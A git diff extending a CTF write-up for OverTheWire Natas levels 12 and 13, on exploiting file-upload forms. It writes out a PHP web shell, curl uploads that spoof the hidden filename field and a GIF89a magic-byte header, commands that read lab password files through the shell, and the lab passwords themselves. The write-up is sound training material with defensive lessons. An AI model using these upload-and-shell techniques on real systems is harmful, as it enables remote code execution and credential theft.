@@ -741,7 +741,200 @@ Don't use **XOR encryption** for sensitive data because it's easily breakable wi
 - **Date**: 2026-03-15
 - **URL**: `http://natas12.natas.labs.overthewire.org`
 - **Password**: `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`
-- **Tools**: Web Browser
+- **Tools**: Web Browser, `curl`, `PHP`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<div id="content">
+
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="lnpldob3zh.jpg" />
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Notice `<input name="uploadedfile" type="file" /><br />`.
+This means we can upload a file to the server! Like a PHP shell script...
+
+Let's create a PHP shell script called `shell.php` with the following content:
+
+```php
+<?php system($_GET["cmd"]);
+```
+
+This script will execute the command passed in the `cmd` GET parameter and return the output.
+Effectively giving us remote shell access to the server!
+
+Let's upload this file to the server with `curl`:
+```powershell
+curl.exe -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "uploadedfile=@shell.php" http://natas12.natas.labs.overthewire.org/
+```
+
+But the returned HTML does not contain a valid uploaded file path!
+
+Notice `<input type="hidden" name="filename" value="lnpldob3zh.jpg" />`.
+This means that the filename is sent by the browser as part of the HTTP request.
+The server likely uses this value as the filename when saving the uploaded file.
+
+So we need to set the filename to `shell.php` when uploading the file with `curl`!
+```powershell
+curl.exe -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "filename=shell.php" -F "uploadedfile=@shell.php" http://natas12.natas.labs.overthewire.org/
+```
+
+Now we get:
+```html
+The file <a href="upload/4y97gpnavy.php">upload/4y97gpnavy.php</a> has been uploaded
+```
+
+Use the cmd GET parameter to run `cat /etc/natas_webpass/natas13`:
+```powershell
+curl.exe -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org/upload/4y97gpnavy.php?cmd=cat%20/etc/natas_webpass/natas13"
+```
+Spaces in URLs must be encoded as `%20`.
+
+And the `curl` command returns:
+```txt
+trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+```
+
+#### The Lesson
+
+Never trust **client‑controlled input** (such as hidden form fields) when handling file uploads.
+
+### Level 13
+
+- **Date**: 2026-03-16
+- **URL**: `http://natas13.natas.labs.overthewire.org`
+- **Password**: `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`
+- **Tools**: Web Browser, `curl`, `PHP`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<div id="content">
+For security reasons, we now only accept image files!<br/><br/>
+
+
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="inos8ptir9.jpg" />
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Let's check out that source code (URL/index-source.html):
+
+```php
+<?php
+
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+    $err=$_FILES['uploadedfile']['error'];
+    if($err){
+        if($err === 2){
+            echo "The uploaded file exceeds MAX_FILE_SIZE";
+        } else{
+            echo "Something went wrong :/";
+        }
+    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+```
+
+Notice `exif_imagetype($_FILES['uploadedfile']['tmp_name'])`.
+This function checks the MIME type of the file to see if it's a valid image.
+
+`exif_imagetype()` reads the first bytes of an image and checks its signature.
+From [https://www.php.net/manual/en/function.exif-imagetype.php](https://www.php.net/manual/en/function.exif-imagetype.php).
+
+So we can spoof the MIME type of our `shell.php` file to make it look like a valid image file!
+
+Our new `shell.php` file:
+```php
+GIF89a
+<?php system($_GET['cmd']);
+```
+
+Upload the file again with `curl`:
+```powershell
+curl.exe -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC -F "filename=shell.php" -F "uploadedfile=@shell.php" http://natas13.natas.labs.overthewire.org/
+```
+
+We get:
+```html
+The file <a href="upload/x1ui4eh89u.php">upload/x1ui4eh89u.php</a> has been uploaded
+```
+
+And use the cmd GET parameter to run `cat /etc/natas_webpass/natas14`:
+```powershell
+curl.exe -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC "http://natas13.natas.labs.overthewire.org/upload/x1ui4eh89u.php?cmd=cat%20/etc/natas_webpass/natas14"
+```
+
+And we get:
+```txt
+GIF89a
+z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+```
+
+#### The Lesson
+
+File headers can be **spoofed**, so they’re not reliable for security!
+
+### Level 14
+
+- **Date**: 2026-03-16
+- **URL**: `http://natas14.natas.labs.overthewire.org`
+- **Password**: `z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`
+- **Tools**: Web Browser, `curl`, `PHP`
 
 #### The Solution
 
